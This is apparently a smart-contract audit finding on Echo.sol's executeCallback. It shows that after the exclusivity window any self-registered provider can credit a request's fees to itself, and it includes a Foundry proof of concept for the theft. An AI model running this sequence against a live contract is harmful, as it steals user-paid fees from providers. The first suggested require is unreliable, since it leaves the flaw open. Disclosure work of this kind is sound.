### Title
Unvalidated `providerToCredit` in `executeCallback` Allows Any Caller to Steal Provider Fees After Exclusivity Period - (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

---

### Summary

`Echo.executeCallback` accepts a caller-supplied `providerToCredit` address and credits the full request fee to it with no check that the address is the registered provider for the request. Once the exclusivity window expires, any unprivileged actor can register a zero-fee provider, call `executeCallback` pointing `providerToCredit` at their own address, and drain the fee that was meant for the legitimate provider.

---

### Finding Description

`executeCallback` takes `providerToCredit` as a free parameter:

```solidity
function executeCallback(
    address providerToCredit,   // ← fully caller-controlled
    uint64 sequenceNumber,
    bytes[] calldata updateData,
    bytes32[] calldata priceIds
) external payable override {
```

The only guard on this parameter is the exclusivity-period check:

```solidity
if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
    require(
        providerToCredit == req.provider,
        "Only assigned provider during exclusivity period"
    );
}
``` [1](#0-0) 

Once `block.timestamp >= req.publishTime + exclusivityPeriodSeconds`, the check is skipped entirely. The fee is then credited unconditionally to whatever address the caller supplied:

```solidity
_state.providers[providerToCredit].accruedFeesInWei += SafeCast
    .toUint128((req.fee + msg.value) - pythFee);
``` [2](#0-1) 

There is no requirement that `providerToCredit` equals `req.provider`, nor any check that `providerToCredit` is even a registered provider. `registerProvider` is permissionless:

```solidity
function registerProvider(
    uint96 baseFeeInWei,
    uint96 feePerFeedInWei,
    uint96 feePerGasInWei
) external override {
    ProviderInfo storage provider = _state.providers[msg.sender];
    require(!provider.isRegistered, "Provider already registered");
    ...
    provider.isRegistered = true;
``` [3](#0-2) 

A registered provider can set any address as its own fee manager and then withdraw via `withdrawAsFeeManager`: [4](#0-3) 

---

### Impact Explanation

An attacker can steal 100 % of the fee paid by a user for any request whose exclusivity period has elapsed. The legitimate provider who set up infrastructure and committed to serving the request receives nothing. At scale, this makes the Echo provider role economically unviable and can drain all pending request fees from the contract.

---

### Likelihood Explanation

The exclusivity period is a short, configurable window (default 15 seconds per the test setup). Any request that the legitimate provider fails to fulfill within that window — due to latency, congestion, or deliberate griefing — becomes a target. The attack requires only:

1. Calling `registerProvider` once (permissionless, zero cost).
2. Calling `setFeeManager(self)` once.
3. Monitoring the mempool for unfulfilled requests past their exclusivity deadline.
4. Calling `executeCallback` with `providerToCredit = attackerAddress`.

No privileged access, no leaked keys, no governance majority is required.

---

### Recommendation

Add a check inside `executeCallback` that `providerToCredit` must equal `req.provider` at all times (not only during the exclusivity window), or at minimum that `providerToCredit` is a registered provider **and** is either the originally assigned provider or has been explicitly authorized by it. For example:

```solidity
require(
    providerToCredit == req.provider ||
    block.timestamp >= req.publishTime + _state.exclusivityPeriodSeconds,
    "..."
);
// AND
require(
    _state.providers[providerToCredit].isRegistered,
    "providerToCredit not registered"
);
```

A stricter fix is to remove the free `providerToCredit` parameter entirely and always credit `req.provider`, adding a separate penalty/redistribution mechanism for late fulfillment.

---

### Proof of Concept

```solidity
// 1. Attacker registers with zero fees (won't attract real users)
vm.prank(attacker);
echo.registerProvider(0, 0, 0);

// 2. Attacker sets themselves as their own fee manager
vm.prank(attacker);
echo.setFeeManager(attacker);

// 3. Legitimate user makes a request to defaultProvider
vm.deal(user, totalFee);
vm.prank(user);
uint64 seq = echo.requestPriceUpdatesWithCallback{value: totalFee}(
    defaultProvider, publishTime, priceIds, callbackGasLimit
);

// 4. Wait for exclusivity period to expire
vm.warp(publishTime + exclusivityPeriodSeconds + 1);

// 5. Attacker calls executeCallback, crediting fees to themselves
echo.executeCallback(attacker, seq, updateData, priceIds);

// 6. Attacker withdraws the stolen fees
uint128 stolen = echo.getProviderInfo(attacker).accruedFeesInWei;
vm.prank(attacker);
echo.withdrawAsFeeManager(attacker, stolen);
// attacker.balance increased by the full provider fee; defaultProvider received 0
```

### Citations

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L113-121)
```text
        // Check provider exclusivity using configurable period
        if (
            block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds
        ) {
            require(
                providerToCredit == req.provider,
                "Only assigned provider during exclusivity period"
            );
        }
```

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L161-162)
```text
        _state.providers[providerToCredit].accruedFeesInWei += SafeCast
            .toUint128((req.fee + msg.value) - pythFee);
```

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L350-379)
```text
    function setFeeManager(address manager) external override {
        require(
            _state.providers[msg.sender].isRegistered,
            "Provider not registered"
        );
        address oldFeeManager = _state.providers[msg.sender].feeManager;
        _state.providers[msg.sender].feeManager = manager;
        emit FeeManagerUpdated(msg.sender, oldFeeManager, manager);
    }

    function withdrawAsFeeManager(
        address provider,
        uint128 amount
    ) external override {
        require(
            msg.sender == _state.providers[provider].feeManager,
            "Only fee manager"
        );
        require(
            _state.providers[provider].accruedFeesInWei >= amount,
            "Insufficient balance"
        );

        _state.providers[provider].accruedFeesInWei -= amount;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send fees");

        emit FeesWithdrawn(msg.sender, amount);
    }
```

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L381-393)
```text
    function registerProvider(
        uint96 baseFeeInWei,
        uint96 feePerFeedInWei,
        uint96 feePerGasInWei
    ) external override {
        ProviderInfo storage provider = _state.providers[msg.sender];
        require(!provider.isRegistered, "Provider already registered");
        provider.baseFeeInWei = baseFeeInWei;
        provider.feePerFeedInWei = feePerFeedInWei;
        provider.feePerGasInWei = feePerGasInWei;
        provider.isRegistered = true;
        emit ProviderRegistered(msg.sender, feePerGasInWei);
    }
```
